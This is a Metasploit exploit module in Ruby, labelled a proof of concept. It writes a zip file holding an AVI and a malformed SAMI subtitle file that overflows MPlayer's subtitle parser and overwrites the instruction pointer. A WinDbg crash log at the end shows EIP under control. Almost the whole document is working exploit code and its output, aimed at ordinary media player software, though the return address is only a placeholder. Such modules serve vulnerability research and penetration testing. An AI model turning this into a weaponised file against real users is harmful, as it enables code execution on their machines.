require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MPlayer SAMI Subtitle File PoC',
			'Description'    => %q{
					This module is simply a trigger for the MPlayer
				SAMI Subtitle Parser issue. To trigger, run the .avi file
				from the same directory as the .smi file.
			},
			'License'        => 'BSD_LICENSE',
			'Author'         => [ 'Mario Ceballos' ],
			'References'     =>
				[
					[ 'URL', 'http://labs.mwrinfosecurity.com/files/Advisories/mwri_mplayer-sami-subtitles_2011-08-12.pdf' ],
					[ 'BID', '49149' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'          => 750,
					'BadChars'       => "",
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'smplayer-0.6.9', { 'Ret' => 0x41414141 } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Aug 8 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.zip' ]),
			], self.class)
	end

	def exploit

		name = rand_text_alpha_upper(5)

		# Borrow a file thats availiable.
		path = File.join( Msf::Config.install_root, "data", "exploits", "CVE-2010-0480.avi" )
		fd = File.open(path, "rb" )
		avi = fd.read(fd.stat.size)
		fd.close

		eip = [target.ret].pack('V')

		sami = %Q|<SAMI>
<BODY>
<SYNC Start=0>
#{rand_text_alpha_upper(26)}
#{rand_text_alpha_upper(995)}
#{eip}
</SAMI>|

		zip = Rex::Zip::Archive.new
		zip.add_file("#{name}.avi",avi)
		zip.add_file("#{name}.smi",sami)

		file_create(zip.pack)
	end
end
__END__
(7ac.720): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=44494754 ecx=02f40698 edx=02f7b578 esi=414b5650 edi=5a4f4b54
eip=41414141 esp=0022e590 ebp=4c585842 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202
41414141 ??              ???
0:000> k
ChildEBP RetAddr  
WARNING: Frame IP not in any known module. Following frames may be wrong.
0022e58c 02f7b578 0x41414141
0022e5f8 7c94b244 0x2f7b578
0022e614 7c91043e ntdll!LdrAlternateResourcesEnabled+0x2b05
0022e638 7c914152 ntdll!RtlAcquirePebLock+0x31
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for mpla
yer.exe - 
0022e67a 01780000 ntdll!RtlDetermineDosPathNameType_U+0x690
0022e67e 00000000 mplayer!SDL_iconv_string+0x9e0fa0
